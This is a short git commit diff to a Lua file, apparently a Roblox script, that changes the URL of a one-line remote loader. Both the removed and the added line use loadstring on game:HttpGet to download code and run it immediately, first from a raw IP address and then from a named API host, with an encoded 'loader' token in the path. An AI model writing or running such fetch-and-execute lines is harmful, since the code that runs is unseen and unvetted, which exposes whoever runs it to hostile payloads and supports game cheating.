95e4ef867461380bd31322739d814048f73f90b6
TakZ-bit <tak72086@gmail.com>
2026-04-07 20:00:29 +0630

    Update S.lua

--- S.lua
+++ S.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6Ijk3NDc3YTA4LTYyMDctNDkwMC04NmMwLTdlYjBlMDMwODc3ZSIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6Ijk3NDc3YTA4LTYyMDctNDkwMC04NmMwLTdlYjBlMDMwODc3ZSIsImtpbmQiOiJsb2FkZXIifQ"))()
